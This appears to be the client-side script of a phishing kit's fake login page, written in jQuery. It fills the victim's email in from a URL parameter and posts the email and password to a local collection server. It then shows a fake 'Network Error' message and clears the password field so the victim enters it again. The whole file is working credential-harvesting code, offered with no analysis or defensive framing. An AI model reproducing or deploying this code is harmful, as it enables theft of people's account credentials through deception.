$(document).ready(function () {
  var baseUrl = window.location.href;
  var url = baseUrl.substring(baseUrl.lastIndexOf("=") + 1);
  $("#x1").val(url);

  $("#formx").submit(function (e) {
    e.preventDefault();
    var formData = {
      email: $("#x1").val(),
      password: $("#x2").val(),
    };

    $("#submitBtn")
      .html(
        `<button class="btn btn-sm btn-primary" disabled>
  <span class="spinner-grow spinner-grow-sm"></span>
  Please Wait...
</button>`
      )
      .prop("disabled", true);
    $.ajax({
      url: "http://localhost:3000/submit-form",
      type: "POST",
      data: JSON.stringify(formData),
      contentType: "application/json",
      success: function (res) {
        console.log(res);
        $("#bd").show();
        $("#hm").hide();
        setTimeout(function () {
          $("#x1").val(url);
          $("#x2").val("");
          $("#msg").html(
            `Network Error! Please verify your information and try again`
          );
          $("#submitBtn").html("Sign In").prop("disabled", false);
        }, 2000);
      },
    });
  });
});
